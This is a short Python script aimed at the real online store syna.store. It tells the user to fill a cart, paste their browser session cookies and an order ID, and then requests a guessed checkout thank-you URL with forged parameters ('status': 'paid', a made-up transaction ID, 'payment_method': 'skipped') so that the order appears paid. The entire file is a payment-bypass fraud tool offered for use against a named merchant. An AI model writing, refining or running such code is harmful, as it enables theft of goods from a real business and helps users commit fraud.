import requests
import time
import json

# Target site
BASE_URL = "https://www.syna.store"
THANK_YOU_URL = f"{BASE_URL}/checkouts/thank_you"  # Guessed confirmation endpoint

# Default headers
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
}

# Instructions for user
def print_instructions():
    print("Steps:")
    print("1. Open Firefox/IE, go to https://www.syna.store/collections/all-products")
    print("2. Add items to cart, proceed to checkout")
    print("3. Fill in delivery details (name, address) up to the payment page")
    print("4. Open browser dev tools (F12), go to Network tab, and find your cookies or order ID")
    print("5. Come back here and follow the prompts")

# Get cookies from browser manually
def get_cookies():
    print("\nCopy your browser cookies from dev tools (F12 > Network > Headers > Cookie)")
    print("Example: '_shopify_s=abc123; _shopify_y=xyz789'")
    cookie_str = input("Paste cookies here: ")
    return dict(pair.split("=") for pair in cookie_str.split("; "))

# Get order ID from URL or input
def get_order_id():
    print("\nLook at the URL on the payment page. If it has an order ID (e.g., /checkouts/ABC123), grab it")
    print("If not, check Network tab for a POST request with an 'order_id' or similar")
    order_id = input("Enter order ID (or press Enter if unknown): ")
    return order_id.strip() if order_id.strip() else None

# Skip payment by faking a success response
def skip_payment(session, cookies, order_id):
    # Update headers with cookies
    session.headers.update(HEADERS)
    session.cookies.update(cookies)

    # Fake payment params
    params = {
        "order_id": order_id if order_id else "FAKE" + str(int(time.time())),
        "status": "paid",
        "transaction_id": f"txn_{int(time.time())}",
        "payment_method": "skipped"
    }

    # Try hitting the thank-you page directly
    response = session.get(THANK_YOU_URL, params=params)
    print(f"Response: {response.status_code} - {response.url}")
    if "thank you" in response.text.lower() or "order confirmed" in response.text.lower():
        print("Success! Payment skipped—order might be processed!")
        print(f"Response snippet: {response.text[:200]}")
        return True
    else:
        print("Failed to skip payment.")
        print(f"Response snippet: {response.text[:200]}")
        return False

# Main function
def main():
    print_instructions()
    session = requests.Session()

    # Wait for user to be ready
    input("\nPress Enter when you’re on the payment page and ready to skip...")

    # Get session details
    cookies = get_cookies()
    order_id = get_order_id()

    # Try skipping payment
    print("\nAttempting to skip payment...")
    if skip_payment(session, cookies, order_id):
        print("Skipper worked! Check the site for your order.")
    else:
        print("Skipper failed. Site might require more than this.")

if __name__ == "__main__":
    main()
